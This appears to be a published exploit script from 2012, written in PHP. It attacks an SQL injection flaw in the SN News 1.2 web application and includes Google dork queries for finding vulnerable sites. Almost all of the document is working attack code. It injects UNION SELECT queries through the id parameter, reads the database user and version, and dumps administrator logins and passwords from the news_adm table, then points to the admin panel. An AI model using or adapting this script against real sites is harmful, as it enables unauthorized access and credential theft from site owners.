# Exploit Title: SN News <= 1.2 SQL Injection
# Google Dork: intext:"Produzido por Clenisson Calaça."
# Google Dork: inurl:"snews/visualiza.php?id="
# Date: 05th 06 2012
# Software Link: http://phpbrasil.com/script/JHnpFRmSBqlf/sn-news
# Version: 1.2
# Tested on: Debian GNU/Linux,Windows 7 Ultimate
Example:
$ php mnews.php http://target.com/scripts/mnews/
error_reporting(E_ERROR);
set_time_limit(0);
@ini_set("default_socket_timeout", 30);
function hex($string){
    $hex=''; // PHP 'Dim' =]
    for ($i=0; $i < strlen($string); $i++){
        $hex .= dechex(ord($string[$i]));
    }
    return '0x'.$hex;
}
echo "
SN News <= 1.2 SQL Injection exploit
";
echo "Discovered and written by WhiteCollarGroup
";
echo "www.wcgroup.host56.com - whitecollar_group@hotmail.com

";
if($argc!=2) {
	echo "Usage: 
";
	echo "php $argv[0] <target url>
";
	echo "Example:
";
	echo "php $argv[0] http://www.website.com/snnews
";
	exit;
}
$target = $argv[1];
if(substr($target, (strlen($target)-1))!="/") {
	$target .= "/";
}
$inject = $target . "visualiza.php?id=-0'%20";
$token = uniqid();
$token_hex = hex($token);
echo "[*] Trying to get informations...
";
$infos = file_get_contents($inject.urlencode("union all select 1,concat(".$token_hex.", user(), ".$token_hex.", version(), ".$token_hex."),3,4,5-- "));
$infos_r = array();
preg_match_all("/$token(.*)$token(.*)$token/", $infos, $infos_r);
$user = $infos_r[1][0];
$version = $infos_r[2][0];
if($user) {
	echo "[*] MySQL version: $version
";
	echo "[*] MySQL user: $user
";
} else {
	echo "[-] Error while getting informations.
";
}
echo "[*] Getting users...
";
$i = 0;
while(true) {
	$dados_r = array();
	$dados = file_get_contents($inject.urlencode("union all select 1,concat(".$token_hex.", login, ".$token_hex.", senha, ".$token_hex."),3,4,5 from news_adm limit $i,1-- "));
	preg_match_all("/$token(.*)$token(.*)$token/", $dados, $dados_r);
	$login = $dados_r[1][0];
	$senha = $dados_r[2][0];
	if(($login) AND ($senha)) {
		echo "-+-
";
		echo "User: $login
";
		echo "Pass: $senha
";
	} else {
		break;
	}
	$i++;
}
echo "-+-+-
";
if($i!=0) {
	echo "[!] Admin login: {$target}admin/
";
} else {
	echo "[-] Exploit failed. Make sure that's server is using a valid version of SN News without Apache mod_security.
We're sorry.";
}
echo "
";

